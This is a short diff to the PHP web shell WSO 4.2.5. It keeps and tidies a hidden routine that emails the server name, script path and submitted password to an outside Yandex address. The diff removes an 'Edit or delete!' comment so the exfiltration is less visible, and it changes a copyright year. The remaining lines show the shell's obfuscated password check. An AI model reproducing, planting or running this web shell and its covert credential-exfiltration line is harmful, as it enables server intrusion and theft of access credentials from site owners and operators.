@@ -2,7 +2,7 @@
 <?php /*** WSO 4.2.5 (Web Shell) ***/
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('kalix.xalik@yandex.com', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('kalix.xalik@yandex.com', 'root', $tmp);
 }
 $▛ = "";
 $▘ = false;
@@ -37,7 +37,7 @@ if(get_magic_quotes_gpc()) {
 	$_POST = stripslashes_array($_POST);
     $_COOKIE = stripslashes_array($_COOKIE);
 }
-/* (С) 11.2011 oRb */
+/* (С) 11.2020 oRb */
 if(!empty($▛)) {
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
         prototype(md5($_SERVER['HTTP_HOST']), $▛);
